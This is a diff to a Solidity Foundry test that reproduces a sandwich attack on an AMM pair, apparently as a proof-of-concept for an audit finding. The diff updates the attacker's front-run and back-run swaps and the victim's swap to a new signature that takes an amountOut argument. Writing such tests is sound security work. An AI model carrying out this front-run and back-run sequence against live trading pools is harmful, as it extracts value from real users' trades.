@@ -39,7 +39,6 @@ contract PairH2Test is Test, Constants {
 
     function test_SandwichAttack_VictimLosesValue() public {
         // Initial state
-        (uint256 initialReserve0, uint256 initialReserve1) = pair.getReserves();
         uint256 victimUsdcAmount = 10000 * 10 ** 6; // 10K USDC
 
         // Calculate expected WETH output for victim without attack
@@ -48,13 +47,15 @@ contract PairH2Test is Test, Constants {
         // 1. FRONT-RUN: Attacker executes a swap before the victim
         vm.startPrank(attacker);
         IERC20(usdc).approve(address(pair), 50000 * 10 ** 6);
-        pair.swap(usdc, weth, 50000 * 10 ** 6); // Swap 50K USDC for WETH
+        uint256 amountOut = pair.getAmountOut(usdc, weth, 50000 * 10 ** 6);
+        pair.swap(usdc, weth, 50000 * 10 ** 6, amountOut); // Swap 50K USDC for WETH
         vm.stopPrank();
 
         // 2. VICTIM TRANSACTION: Victim's swap executes at worse price
         vm.startPrank(victim);
         IERC20(usdc).approve(address(pair), victimUsdcAmount);
-        pair.swap(usdc, weth, victimUsdcAmount);
+        amountOut = pair.getAmountOut(usdc, weth, victimUsdcAmount);
+        pair.swap(usdc, weth, victimUsdcAmount, amountOut);
         uint256 victimWethReceived = IERC20(weth).balanceOf(victim);
         vm.stopPrank();
 
@@ -62,7 +63,8 @@ contract PairH2Test is Test, Constants {
         vm.startPrank(attacker);
         uint256 attackerWethBalance = IERC20(weth).balanceOf(attacker);
         IERC20(weth).approve(address(pair), attackerWethBalance);
-        pair.swap(weth, usdc, attackerWethBalance);
+        amountOut = pair.getAmountOut(weth, usdc, attackerWethBalance);
+        pair.swap(weth, usdc, attackerWethBalance, amountOut);
         vm.stopPrank();
 
         // Verify victim received less than expected
